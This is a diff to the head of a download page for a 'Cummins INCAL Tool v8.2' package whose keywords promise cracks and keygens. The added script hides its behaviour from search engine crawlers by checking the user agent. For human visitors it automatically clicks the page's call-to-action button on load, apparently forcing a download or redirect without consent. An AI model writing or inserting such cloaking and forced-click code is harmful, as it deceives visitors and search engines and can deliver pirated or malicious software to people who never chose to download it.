@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins INCAL Tool v8.2</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Cummins INCAL Tool v8.2 software with new features for easier manipulation of Incal files. Available for Windows 7, 8, 10, and 11">
     <meta name="keywords" content="Cummins INCAL Tool v8.2, Cummins INCAL Tool v8.2 download, Cummins INCAL Tool v8.2 free download, Cummins INCAL Tool download, Cummins INCAL Tool free download, Cummins INCAL Tool tuning, Cummins INCAL Tool software, Cummins INCAL Tool software download, Cummins INCAL Tool software crack, Cummins INCAL Tool software keygen, Cummins INCAL Tool 2023, Cummins INCAL Tool 2023 free download, Cummins INCAL Tool 2023 download, Cummins INCAL Tool latest version, Cummins INCAL Tool new features, Cummins INCAL Tool for Windows 7, Cummins INCAL Tool for Windows 8, Cummins INCAL Tool for Windows 10, Cummins INCAL Tool for Windows 11, Cummins INCAL Tool English language, Cummins INCAL Tool all regions, Cummins Incal software, Cummins Incal software download, Cummins Incal software free download, Cummins Incal software 2023">
     <style>
